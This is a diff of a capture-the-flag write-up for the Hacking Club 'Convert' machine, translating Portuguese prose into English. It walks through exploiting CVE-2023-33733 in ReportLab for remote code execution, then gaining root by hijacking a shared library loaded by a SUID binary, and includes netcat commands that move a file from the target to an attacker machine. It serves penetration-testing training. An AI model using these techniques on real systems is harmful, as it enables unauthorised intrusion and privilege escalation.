@@ -1,20 +1,14 @@
 ---
 title: 'Convert Writeup'
 date: '2024-11-17'
-tags: ['CVE-2023-33733', 'RCE', 'Linux']
+tags: ['CVE-2023-33733', 'RCE', 'Linux', 'Hacking Club']
 draft: false
-summary: 'Aplicação possui vulnerabilidades de execução remota de código (RCE) na biblioteca ReportLab e elevação de privilégios via "Shared Library Hijacking".'
+summary: 'The application has remote code execution (RCE) vulnerabilities in the ReportLab library and privilege escalation via "Shared Library Hijacking".'
 images: ['/static/images/convert-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/convert-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Convert
 
 ---
 
@@ -43,25 +37,25 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 `http://172.16.9.251`
 
-Uma aplicação chamada Convert, que possui a funcionalidade de converter arquivos **HTML** para **PDF**.
+An application called **Convert**, which has the functionality to convert **HTML** files into **PDF**.
 
 ![convert](/static/images/convert-writeup-images/image.png)
 
-A aplicação possui um bloqueio, permitindo somente arquivos HTML sejam submetidos, tentei bypassar o filtro mas não obtive sucesso.
+The application has a restriction, allowing only HTML files to be submitted. I tried bypassing the filter but was unsuccessful.
 
 ![convert 1](/static/images/convert-writeup-images/image1.png)
 
-Após submeter um arquivo html qualquer, a aplicação converte para PDF.
+After submitting any HTML file, the application converts it to PDF.
 
-Depois de converter, podemos identificar com a ferramenta `exiftool` qual foi a ferramenta/biblioteca utilizada para realizar a conversão.
+After converting, we can use the **exiftool** tool to identify which tool/library was used for the conversion.
 
 ![convert 2](/static/images/convert-writeup-images/image2.png)
 
-Com o nome do produtor em mãos, podemos verificar que existe uma CVE relacionada.
+With the producer's name in hand, we can check if there is a related CVE.
 
 ![convert 3](/static/images/convert-writeup-images/image3.png)
 
-Para explorar `CVE-2023-33733` vamos mandar um arquivo `.html` malicioso, que vai nos gerar um RCE.
+To exploit **CVE-2023-33733**, we will send a malicious **.html** file, which will grant us RCE.
 
 https://github.com/c53elyas/CVE-2023-33733
 
@@ -93,17 +87,17 @@ https://github.com/c53elyas/CVE-2023-33733
 
 ![convert 6](/static/images/convert-writeup-images/image6.png)
 
-Ao acessar o diretório `binary` e executar o arquivo `ucount` que está como `SUID`, percebemos que ele retorna a contagem dos usuários do sistema.
+Upon accessing the **binary** directory and executing the **ucount** file, which has the SUID bit set, we notice that it returns the count of system users
 
 ![convert 7](/static/images/convert-writeup-images/image7.png)
 
-Utilizando o comando strace , podemos confirmar que o arquivo está utilizando a biblioteca `librunner.so` , que está dentro do diretório `functions`
+Using the **strace** command, we can confirm that the file is using the **librunner.so** library, which is inside the functions directory.
 
 ![convert 8](/static/images/convert-writeup-images/image8.png)
 
-Com isso, a gente pode utilizar um técnica de Privillege Escalation conhecida como **Shared Library Hijacking**, criando nossa propria [`l](http://lbrunner.so)ibrunner.so`para ser executada pelo`SUID` `ucount`.
+With this, we can use a privilege escalation technique known as **Shared Library Hijacking**, creating our own **librunner.so** to be executed by the SUID **ucount**.
 
-Entretanto, nós não temos permissão de alterar a `librunner.so` diretamente, pois não temos permissão, mas o arquivo está na pasta do nosso usuário (flaskuser), e nela podemos alterar.
+However, we do not have permission to modify **librunner.so** directly, but since the file is in our user's folder (flaskuser), we can alter it.
 
 ```python
 mv binary/ binary2
@@ -112,14 +106,14 @@ mkdir -p binary/functions
 
 ![convert 9](/static/images/convert-writeup-images/image9.png)
 
-Agora, iremos criar a nossa lib maliciosa para jogarmos dentro do da pasta que criamos.
+Now, we will create our malicious library and place it inside the folder we just created.
 
-Pra isso, vamos mandar o `librunner.so` original para a nossa maquina e analisar melhor.
+To do this, let's transfer the original **librunner.so** to our machine for further analysis.
 
 ```python
-#maquina atacante
+#attacker machine
 nc -lnvp 1234 > librunner.so
-#maquina alvo
+#target machine
 nc 10.0.31.150 1234 < librunner.so
 ```
 
@@ -127,9 +121,9 @@ nc 10.0.31.150 1234 < librunner.so
 
 ![convert 11](/static/images/convert-writeup-images/image11.png)
 
-Abrindo o arquivo no **Ghidra**, vemos que tem uma função chamada `isRoot` e é ela que vamos utilizar pra ganhar root no sistema.
+Opening the file in **Ghidra**, we see a function called **isRoot**, and we will use it to gain root access to the system.
 
-Edit: Foi mal galera, a print saiu cortada 😄
+Edit: Sorry, guys, the screenshot got cut off 😄
 
 ![convert 12](/static/images/convert-writeup-images/image12.png)
 
@@ -152,7 +146,7 @@ void lineCounter() {
 
 ![convert 13](/static/images/convert-writeup-images/image13.png)
 
-Agora só executar o SUID, que está localizado no diretório que criamos (binary2)
+Now, just execute the SUID file located in the directory we created (binary2).
 
 ![convert 14](/static/images/convert-writeup-images/image14.png)
 
